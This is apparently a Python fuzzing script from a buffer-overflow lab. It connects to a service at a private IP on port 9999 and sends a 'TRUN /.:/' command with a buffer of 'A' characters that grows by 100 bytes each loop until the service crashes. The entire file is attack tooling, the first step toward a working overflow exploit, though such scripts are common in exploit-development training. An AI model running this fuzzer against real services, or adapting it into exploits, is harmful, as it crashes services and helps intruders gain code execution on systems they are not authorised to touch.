#!/usr/bin/python 

import socket,sys

from time import sleep

#address = '192.168.34.161' 
#port = '9999'
buffer = "A" * 100

while True:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.34.165',9999))
        #print("connected")
        payload = (('TRUN /.:/' + buffer))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A" * 100
    except:
        print("Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()


